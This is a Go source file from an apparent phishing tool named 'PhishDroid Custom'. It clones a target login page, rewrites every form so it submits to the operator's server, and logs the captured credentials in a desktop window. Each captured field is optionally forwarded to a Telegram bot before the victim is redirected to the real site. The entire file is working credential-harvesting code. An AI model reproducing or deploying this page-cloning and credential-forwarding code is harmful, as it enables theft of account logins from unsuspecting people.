package main

import (
	"fmt"
	"log"
	"net/http"
	"strings"

	"fyne.io/fyne"
	"fyne.io/fyne/dialog"
	"fyne.io/fyne/widget"

	"github.com/PuerkitoBio/goquery"

	"github.com/raifpy/Go/errHandler"
)

var notiApp fyne.App

func customHTMLwithHTTP(url, serverLink string) map[string]interface{} {
	httpMap := map[string]interface{}{}
	request, err := http.NewRequest("GET", url, nil)
	if errHandler.HandlerBool(err) {
		httpMap["error"] = err
		return httpMap
	}
	request.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36")
	client := http.Client{}
	response, err := client.Do(request)
	if errHandler.HandlerBool(err) {
		httpMap["error"] = err
		return httpMap
	}

	var scripts int
	var inputValues []string

	doc, err := goquery.NewDocumentFromResponse(response)
	if errHandler.HandlerBool(err) {
		httpMap["error"] = err
		return httpMap
	}
	//doc.Append(fmt.Sprintf(`<base href="%s">`, url))
	doc.AppendHtml(fmt.Sprintf(`<base href="%s">`, url))

	doc.Find("script").Each(func(index int, script *goquery.Selection) {
		log.Println("<script> : ", index)
		scripts++
	})

	//inputValues := make([]string, 0)

	doc.Find("input").Each(func(index int, s *goquery.Selection) {
		if name, ok := s.Attr("name"); ok {
			log.Println(index, name)
			inputValues = append(inputValues, name)
		}

	})

	doc.Find("form").Each(func(index int, f *goquery.Selection) {
		f.SetAttr("action", serverLink+"/login")
	})
	html, err := doc.Html()
	if errHandler.HandlerBool(err) {
		httpMap["error"] = err
		return httpMap
	}

	httpMap["scripts"] = scripts
	httpMap["values"] = inputValues
	httpMap["html"] = html

	return httpMap

}

func customHTMLServer(win fyne.Window, textGrid *widget.TextGrid, html, redirectURL string, textStream *string) {
	serve := func(response http.ResponseWriter, request *http.Request) {
		*textStream += "New Request\n"
		textGrid.SetText(*textStream)
		fmt.Fprintln(response, html)
		return
	}
	serveLogin := func(response http.ResponseWriter, request *http.Request) {

		request.ParseForm()
		valueStr := request.Form.Encode()
		for _, eleman := range strings.Split(valueStr, "&") {
			*textStream += strings.Replace(eleman, "=", "  :  ", -1) + "\n"
			if useTelegramBot {
				tg.send(eleman)
			}
		}
		textGrid.SetText(*textStream)

		notiApp.SendNotification(fyne.NewNotification("New Form", valueStr))
		http.Redirect(response, request, redirectURL, 301)
	}

	http.HandleFunc("/", serve)
	http.HandleFunc("/login", serveLogin)

	err := http.ListenAndServe(":8089", nil)
	if err != nil {
		dialog.ShowError(err, win)

	}

}

func makeCustomWindow(win fyne.Window, html, serverURL, redirectURL string) {
	var str string
	ngrokText := widget.NewTextGridFromString(serverURL)
	panel := widget.NewTextGrid()
	group := widget.NewGroupWithScroller("PhishDroid Custom", ngrokText, cizgi, space, panel)
	win.SetContent(group)
	customHTMLServer(win, panel, html, redirectURL, &str)
}
